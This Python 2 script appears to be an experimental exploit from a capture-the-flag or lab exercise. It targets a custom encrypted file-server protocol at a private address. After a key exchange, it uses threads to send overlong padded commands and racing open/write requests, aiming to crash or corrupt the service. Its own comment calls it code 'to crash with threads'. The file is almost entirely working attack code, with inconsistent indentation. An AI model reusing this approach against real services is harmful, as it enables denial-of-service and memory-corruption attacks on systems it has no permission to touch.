#!/usr/bin/env python
#experimental code to crash with threads. use the other one for the solution
import socket
import array
import struct
import threading
import random
#https://github.com/stef/pysodium
import pysodium


TCP_IP = '10.0.0.1'
TCP_PORT = 20008
BUFFER_SIZE = 1024

class myThread (threading.Thread):
    def __init__(self, threadID, name, count, s):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.count = count
	self.s = s
    def run(self):
        dosomedemage(self.name, self.count, self.s)

def encrypt_message(nonce, public_key, secret_key, message):
	lenmessage = struct.pack("<I", len(message))+message
	encrypted = pysodium.crypto_box(lenmessage, nonce, public_key, secret_key)
	encrypted = nonce + "\x00"*16 + encrypted
	length = struct.pack("<I", len(encrypted))
	
	return length+encrypted

def decrypt_message(public_key, secret_key, message):
	decrypted = pysodium.crypto_box_open(message[40:], message[0:24], public_key, secret_key)
	return decrypted

def dosomedemage(name, count, s):
	while True:
		if name in "first":
			message = "m0777sh"+"B"*260
		if name in "second":
			message = "m0777test4" + "B"*250
		if name in "third":
			message = "o0777testfile3\x00"
			s.send(encrypt_message(nonce, server_pub, client_priv, message))
			size = s.recv(4)
			size = struct.unpack("<I", size)[0]
			data = s.recv(size)
			try:
				decryptedmessage = decrypt_message(server_pub, client_priv, data)
				print "%s" % decryptedmessage
				message = "w"+str(int(decryptedmessage[10:13]))+",0"+"C"*random.randint(10,3000)
			except:
				message = "c7"
		s.send(encrypt_message(nonce, server_pub, client_priv, message))
		size = s.recv(4)
		size = struct.unpack("<I", size)[0]
		data = s.recv(size)
		try:
			print "%s" % decrypt_message(server_pub, client_priv, data)
		except:
			print data



client_pub, client_priv = pysodium.crypto_box_keypair()
nonce = pysodium.randombytes(pysodium.crypto_box_NONCEBYTES)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
server_pub = s.recv(BUFFER_SIZE)

s.send(str(client_pub))

thread1 = myThread(1, "first", 1000, s)
thread2 = myThread(2, "second", 10, s)
thread3 = myThread(3, "third", 1, s)

thread1.start()
#thread2.start()
#thread3.start()

#s.close()
